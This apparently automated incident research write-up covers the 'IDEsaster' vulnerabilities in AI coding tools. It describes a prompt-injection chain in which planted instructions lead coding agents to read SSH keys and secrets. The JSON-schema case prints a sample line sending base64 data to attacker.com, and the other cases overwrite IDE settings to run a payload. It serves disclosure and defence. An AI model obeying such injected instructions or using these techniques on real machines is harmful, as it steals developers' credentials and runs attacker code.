# AAGF-2026-016 Research Document

**Subject:** IDEsaster -- 30+ Vulnerabilities Across All Major AI Coding Tools (24+ CVEs)
**Primary sources:** https://maccarita.com/posts/idesaster/ and https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html
**Researcher:** Claude (automated deep research)
**Date researched:** 2026-05-05
**Suggested ID:** AAGF-2026-016

---

## Source Inventory

| Source | URL | Type | Credibility | Notes |
|--------|-----|------|-------------|-------|
| MaccariTA blog (Ari Marzouk) | https://maccarita.com/posts/idesaster/ | Primary -- researcher blog | High | Original disclosure post by the researcher. Published December 6, 2025. |
| The Hacker News | https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html | Independent journalism | High | Comprehensive coverage with CVE details and vendor responses. |
| NVD CVE-2025-53773 | https://nvd.nist.gov/vuln/detail/CVE-2025-53773 | Primary -- government | High | Official NIST entry for GitHub Copilot command injection. CVSS 7.8 HIGH. |
| AWS Security Bulletin AWS-2025-019 | https://aws.amazon.com/security/security-bulletins/AWS-2025-019/ | Primary -- vendor advisory | High | Official AWS advisory covering Kiro and Amazon Q Developer. Published October 7, 2025. |
| Tigran.tech analysis | https://tigran.tech/securing-ai-coding-agents-idesaster-vulnerabilities/ | Security analysis | Medium-High | Technical breakdown of attack chains and MCP implementation flaws. |
| GBHackers | https://gbhackers.com/ai-developer-tools/ | Independent journalism | Medium-High | Coverage of affected tools and scope. Published December 8, 2025. |
| Cloud Security Newsletter | https://www.cloudsecuritynewsletter.com/p/idesaster-ai-ide-vulnerabilities-attack-surface | Security community | Medium-High | Attack surface analysis. |
| TechBytes | https://techbytes.app/posts/idesaster-ai-ide-security-vulnerabilities/ | Independent journalism | Medium | Summary coverage with CVE list. |
| Yahoo Tech / TechRadar | https://tech.yahoo.com/cybersecurity/articles/critical-flaws-found-ai-development-142628173.html | Independent journalism | Medium-High | Mainstream tech coverage. |
| TechWorm | https://www.techworm.net/2025/12/researchers-find-30-security-flaws-in-ai-coding-tools.html | Independent journalism | Medium | Additional coverage and 1.8M developer impact figure. |
| Embrace The Red (Kiro analysis) | https://embracethered.com/blog/posts/2025/aws-kiro-aribtrary-command-execution-with-indirect-prompt-injection/ | Security research | High | Independent confirmation of Kiro RCE via prompt injection. |

**Source quality summary:** Strong. Primary researcher blog provides full technical detail across three case studies. NVD entries confirm CVE assignments with CVSS scores. AWS issued an official security bulletin (AWS-2025-019) confirming Kiro/Q vulnerabilities. Multiple independent security outlets corroborate findings. No contradictions found across sources.

---

## Who Was Affected

**Primary targets:** Developers using AI-powered coding tools and IDEs

**Affected products (10+ confirmed):**
1. **GitHub Copilot** (Microsoft) -- CVE-2025-53773, CVE-2025-64660
2. **Cursor** -- CVE-2025-49150, CVE-2025-54130, CVE-2025-61590
3. **Windsurf** (Codeium)
4. **Kiro.dev** (AWS) -- covered by AWS-2025-019
5. **Zed.dev** -- CVE-2025-55012
6. **Roo Code** -- CVE-2025-53097, CVE-2025-53536, CVE-2025-58372
7. **JetBrains Junie** -- CVE-2025-58335
8. **Cline**
9. **Gemini CLI** (Google)
10. **Claude Code** (Anthropic)
11. **Amazon Q Developer** -- covered by AWS-2025-019

**Scale:** ~1.8 million developers at risk across all affected tools. 100% of tested AI IDEs were found vulnerable.

---

## Timeline

| Date | Event | Source |
|------|-------|--------|
| ~June 2025 | Research begins; Ari Marzouk starts discovering vulnerabilities over a 6-month period | MaccariTA blog |
| July 17, 2025 | AWS patches Amazon Q Developer Language Server to v1.22.0 (RCE fix) | AWS-2025-019 |
| July 29, 2025 | AWS patches Amazon Q Developer Language Server to v1.24.0 (secrets exfiltration fix) | AWS-2025-019 |
| August 1, 2025 | AWS patches Kiro to v0.1.42 (arbitrary code execution fix) | AWS-2025-019 |
| August 12, 2025 | CVE-2025-53773 published in NVD (GitHub Copilot) | NVD |
| October 7, 2025 | AWS publishes Security Bulletin AWS-2025-019 | AWS |
| December 6, 2025 | Ari Marzouk publishes full IDEsaster disclosure on MaccariTA blog | MaccariTA |
| December 8, 2025 | The Hacker News and other outlets publish coverage | Multiple |

**date_occurred:** Mid-2025 (vulnerabilities existed in production tools)
**date_discovered:** ~June-November 2025 (6-month research period by Marzouk)
**date_reported:** December 6, 2025 (public disclosure)

---

## What Happened -- Technical Detail

### Overview

Security researcher Ari Marzouk discovered a novel vulnerability class he named "IDEsaster" -- a systematic attack pattern that affects every major AI-powered coding tool. Over six months of research, he identified 30+ distinct vulnerabilities across 10+ products, with 24 receiving CVE assignments. The core finding: 100% of tested AI IDEs were vulnerable to the same fundamental attack chain.

### The IDEsaster Attack Chain

The attack chain is IDE-agnostic and follows a three-stage pattern:

**Stage 1: Context Hijacking (Prompt Injection)**
The attacker plants hidden instructions in any content the AI agent will ingest:
- Rule files (`.cursorrules`, `.windsurfrules`, `.clinerules`, etc.)
- README files or documentation
- File names with invisible Unicode characters
- MCP (Model Context Protocol) server outputs
- Pasted URLs with hidden characters
- MCP server "rug pulls" (legitimate server turned malicious)

**Stage 2: Legitimate Tool Abuse**
The injected prompt instructs the AI agent to use its own legitimate tools:
- `read_file` / `search_files` / `search_project` to access sensitive data (SSH keys, env files, credentials)
- `write_file` / `edit_file` to create or modify files strategically

**Stage 3: IDE Feature Weaponization**
The written/modified files trigger built-in IDE behaviors that execute without user interaction, achieving data exfiltration or remote code execution.

### Case Study #1: JSON Schema Remote Fetch (Data Exfiltration)

**CVEs:** CVE-2025-49150 (Cursor), CVE-2025-53097 (Roo Code), CVE-2025-58335 (JetBrains Junie). Also confirmed in GitHub Copilot, Kiro.dev, and Claude Code.

**Affected IDE platforms:** VS Code-based, JetBrains-based, Zed.dev

**Technique:**
1. Prompt injection instructs the AI to read a sensitive file (e.g., `~/.ssh/id_rsa`, `.env`)
2. AI writes a JSON file containing the stolen data with a `$schema` field pointing to an attacker-controlled URL:
   ```json
   {
     "$schema": "https://attacker.com/log?data=BASE64_ENCODED_SENSITIVE_DATA",
     "stolen": "content here"
   }
   ```
3. The IDE **automatically** fetches the schema URL via a GET request to validate the JSON file
4. The GET request URL contains the exfiltrated data as a query parameter
5. Attacker's server receives the sensitive data

**Key insight:** This works even when diff-preview safeguards are enabled, because the IDE's JSON schema validation is a background feature that fires automatically.

### Case Study #2: IDE Settings File Overwrite (RCE)

**CVEs:** CVE-2025-53773 (GitHub Copilot, CVSS 7.8 HIGH), CVE-2025-54130 (Cursor), CVE-2025-53536 (Roo Code), CVE-2025-55012 (Zed.dev). Also confirmed in Claude Code.

**CWE:** CWE-77 (Improper Neutralization of Special Elements used in a Command)

**Technique (VS Code-based):**
1. Prompt injection instructs the AI to write a malicious payload to a git hook sample file (e.g., `.git/hooks/pre-commit.sample`)
2. AI edits `.vscode/settings.json` to set `php.validate.executablePath` to point to the malicious file
3. AI creates a `.php` file to trigger PHP validation
4. VS Code automatically executes the "PHP validator" (which is actually the malicious payload)

**Technique (JetBrains-based):**
1. Similar pattern but modifies `.idea/workspace.xml`
2. Sets `PATH_TO_GIT` to a malicious executable
3. JetBrains IDE executes the fake Git binary

### Case Study #3: Multi-Root Workspace Configuration (RCE)

**CVEs:** CVE-2025-64660 (GitHub Copilot), CVE-2025-61590 (Cursor), CVE-2025-58372 (Roo Code)

**Affected:** VS Code-based IDEs only

**Technique:**
1. Prompt injection instructs the AI to edit `.code-workspace` files
2. Workspace configuration is modified to redefine root directories
3. IDE executable paths are overridden via workspace settings
4. Achieves code execution **without** requiring the workspace to be reopened
5. Bypasses workspace-boundary protections

### Why This Is a New Vulnerability Class

IDEsaster is distinct from generic prompt injection because:
- It exploits the **intersection** of AI agents and legacy IDE features
- The final payload execution happens in the **IDE layer**, not the LLM layer
- Standard prompt injection mitigations (guardrails, output filtering) are insufficient because the exploit uses **legitimate tools** and **legitimate IDE features**
- The attack chain is **IDE-agnostic** -- the same conceptual exploit works across VS Code, JetBrains, and Zed.dev ecosystems
- Marzouk coined the term "Secure for AI" -- extending secure-by-design principles to account for AI component misuse within existing IDE architectures

### Additional Findings

**MCP Implementation Vulnerabilities:**
- CVE-2025-6514 (MCP Remote): CVSS **9.6 CRITICAL**
- CVE-2025-49596 (MCP Inspector): CSRF vulnerability enabling RCE
- 43% of tested MCP implementations contained command injection vulnerabilities
- 30% allowed unrestricted URL fetching

**Chromium/Electron Vulnerability:**
- CVE-2025-7656: Chromium vulnerability in Cursor and Windsurf
- Cursor and Windsurf ship outdated Electron Framework releases, exposing 1.8M developers to 94+ known Chromium vulnerabilities

---

## CVE Inventory

| CVE | Product | Attack Type | CVSS | Severity |
|-----|---------|-------------|------|----------|
| CVE-2025-49150 | Cursor | JSON Schema exfiltration | -- | -- |
| CVE-2025-53097 | Roo Code | JSON Schema exfiltration | -- | -- |
| CVE-2025-58335 | JetBrains Junie | JSON Schema exfiltration | -- | -- |
| CVE-2025-53773 | GitHub Copilot / VS | Settings overwrite RCE | 7.8 | HIGH |
| CVE-2025-54130 | Cursor | Settings overwrite RCE | -- | -- |
| CVE-2025-53536 | Roo Code | Settings overwrite RCE | -- | -- |
| CVE-2025-55012 | Zed.dev | Settings overwrite RCE | -- | -- |
| CVE-2025-64660 | GitHub Copilot | Multi-root workspace RCE | -- | -- |
| CVE-2025-61590 | Cursor | Multi-root workspace RCE | -- | -- |
| CVE-2025-58372 | Roo Code | Multi-root workspace RCE | -- | -- |
| CVE-2025-6514 | MCP Remote | MCP implementation flaw | 9.6 | CRITICAL |
| CVE-2025-49596 | MCP Inspector | CSRF → RCE | -- | -- |
| CVE-2025-7656 | Cursor / Windsurf | Chromium vulnerability | -- | -- |

**Note:** 24 CVEs were assigned in total; only 13 are enumerated above from available sources. The remaining ~11 CVEs are referenced in the original MaccariTA blog but not individually listed in secondary coverage.

---

## Damage Assessment

### Confirmed Impact
- **100% vulnerability rate** across all tested AI coding tools
- **24+ CVEs** assigned across 10+ products
- **1.8 million developers** potentially exposed
- **AWS issued security bulletin** (AWS-2025-019) -- indicating enterprise-grade severity
- Attack chains enable both **data exfiltration** (credentials, SSH keys, env secrets, source code) and **remote code execution**

### Potential Impact (If Exploited)
- Theft of developer credentials, SSH keys, API tokens from local workstations
- Supply chain attacks via compromised developer environments
- Remote code execution on developer machines
- Lateral movement from developer workstations into production infrastructure
- Source code theft

### Systemic Risk
- The vulnerability class is **architectural** -- it stems from the fundamental design of integrating AI agents with legacy IDE features
- Patching individual CVEs does not eliminate the class; new attack vectors within the same pattern remain discoverable
- MCP ecosystem introduces additional attack surface (43% command injection rate in tested implementations)

---

## Vendor Response

| Vendor/Product | Response | Timeline | Assessment |
|----------------|----------|----------|------------|
| **GitHub Copilot** (Microsoft) | Patched CVE-2025-53773 and CVE-2025-64660 | CVE-2025-53773 published August 12, 2025 | Responsive; code-level fixes |
| **Cursor** | Patched CVE-2025-49150, CVE-2025-54130, CVE-2025-61590 | By December 2025 disclosure | Responsive; code-level fixes |
| **AWS (Kiro / Q Developer)** | Issued AWS-2025-019; patched Language Server and Kiro app | July 17 - August 1, 2025 (patches); October 7, 2025 (bulletin) | Most comprehensive response; official security bulletin with specific version numbers |
| **Roo Code** | Issued fixes for CVE-2025-53097, CVE-2025-53536, CVE-2025-58372 | By December 2025 | Responsive |
| **Google (Gemini CLI)** | Patched within 4 days of disclosure | ~Late 2025 | Fastest response |
| **Claude Code** (Anthropic) | Addressed with security warning in documentation; no code-level fix | By December 2025 | Weakest response -- documentation-only mitigation, potentially insufficient |
| **JetBrains (Junie)** | CVE-2025-58335 assigned | -- | Status unclear from available sources |
| **Zed.dev** | CVE-2025-55012 assigned | -- | Status unclear from available sources |
| **Windsurf** (Codeium) | Confirmed vulnerable | -- | No patch information available |
| **Cline** | Confirmed vulnerable | -- | No patch information available |

---

## Root Cause Analysis

### Fundamental Issue
AI coding agents were integrated into IDEs without re-evaluating the security implications of existing IDE features. Legacy features (JSON schema validation, settings file auto-execution, workspace configuration) were designed for **human-controlled** environments where a developer would never write a malicious settings file. With AI agents that can be manipulated via prompt injection, these features become attack vectors.

### Contributing Factors
1. **No principle of least privilege for LLM tools:** AI agents have broad file read/write permissions
2. **Auto-approved tool calls:** Many IDEs execute tool calls without human confirmation
3. **IDE features fire automatically:** JSON schema fetching, PHP validation, Git operations happen in the background
4. **Prompt injection remains unsolved:** No reliable way to distinguish instructions from data in LLM inputs
5. **MCP ecosystem immaturity:** 43% of MCP implementations have command injection flaws
6. **Outdated Electron/Chromium:** Cursor and Windsurf ship old Electron releases with known vulnerabilities

### Researcher's Recommendation
Marzouk advocates for a "Secure for AI" design philosophy -- extending secure-by-design principles to explicitly account for AI component misuse within legacy IDE architectures. Specific recommendations:
- Apply principle of least privilege to LLM tools
- Minimize prompt injection vectors in context sources
- Harden system prompts against hijacking
- Implement sandboxing for all command execution
- Security-test for path traversal and command injection in all tool interfaces
- Require human-in-the-loop confirmation for sensitive operations

---

## Related Incidents

- **PromptPwnd:** New vulnerability class targeting AI agents in GitHub Actions (discovered concurrently)
- **OpenAI Codex CLI:** CVE-2025-61260 (command injection via MCP) -- discovered around the same time
- **Google Antigravity:** Multiple data exfiltration and RCE vulnerabilities in Google's AI tools
- **EchoLeak (AAGF-2026-012):** Similar prompt injection → exfiltration pattern in Microsoft 365 Copilot

---

## Key Quotes

> "Multiple universal attack chains affected each and every AI IDE tested" -- Ari Marzouk

> AWS credits "Embrace the Red, HiddenLayer, and MaccariTA for coordinated vulnerability disclosure" -- AWS-2025-019

---

## Classification Notes

- **Agent type:** AI coding assistants (agentic IDE integrations)
- **Failure mode:** Prompt injection → legitimate tool abuse → IDE feature weaponization
- **Impact categories:** Data exfiltration, remote code execution, credential theft
- **Novel contribution:** First systematic demonstration that ALL major AI IDEs share the same vulnerability class; introduced "Secure for AI" concept
- **Severity:** HIGH to CRITICAL (CVSS range 7.8-9.6 for scored CVEs)
- **Frameworks affected:** VS Code ecosystem, JetBrains ecosystem, Zed.dev, standalone CLI tools
